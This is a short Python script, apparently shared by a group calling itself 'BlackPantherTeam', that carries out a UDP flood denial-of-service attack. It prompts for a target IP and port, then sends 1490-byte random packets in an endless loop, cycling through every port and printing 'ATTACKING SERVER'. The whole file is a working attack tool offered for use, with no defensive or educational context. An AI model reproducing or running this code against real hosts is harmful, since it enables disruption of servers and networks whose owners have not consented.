import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
print("""\u001b[31m
>>> YouTube : https://www.youtube.com/channel/UC9qwRMJRSWhhkbaS1RU5G_Q/videos <<<
>>> Discord : Manusia#5457 <<<
>>> BlackPantherTeam : https://discord.gg/UzzZ36fnSb <<<""")

ip = str(input("IP TARGET : "))
port = int(input("PORT TARGET :"))

os.system("clear")
print("[BlackPantherTeam] | Wait 3s")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(" [BlackPantherTeam] | ATTACKING SERVER !! ")
     if port == 65534:
       port = 1